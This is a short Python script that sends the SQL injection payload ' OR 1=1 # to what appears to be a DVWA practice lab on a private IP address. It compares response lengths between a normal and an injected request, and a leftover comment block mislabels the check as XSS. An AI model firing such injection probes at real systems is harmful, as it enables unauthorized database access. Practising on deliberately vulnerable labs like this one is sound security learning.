import requests

url = 'http://10.10.244.224/vulnerabilities/sqli/'

value = "' OR 1=1 #"
param_name = "id"

normal_params = {
    param_name : "",
    "Submit" : "Submit#"
}

params = {
   param_name : value,
   "Submit" : "Submit#"
}
headers = {
    "Host" : "10.10.244.224",
    "Referer" : "http://10.10.244.224/vulnerabilities/xss_r/",
    "Cookie" : "PHPSESSID=5vt1q6lk8p19pb3a4s9jvqsme3; security=low"
}

response = requests.get(url, headers=headers, params=normal_params)

code = response.status_code
resp = response.text

#-----------------------------------------
testResponse = requests.get(url, headers=headers, params=params)
testCode = testResponse.status_code
testResp = testResponse.text

print(testCode, len(resp), len(testResp))


#if value in response.text:
#   print("This site is vuln with XSS!")
#   print(value)
#   print(f"{url}?{param_name}={value}")
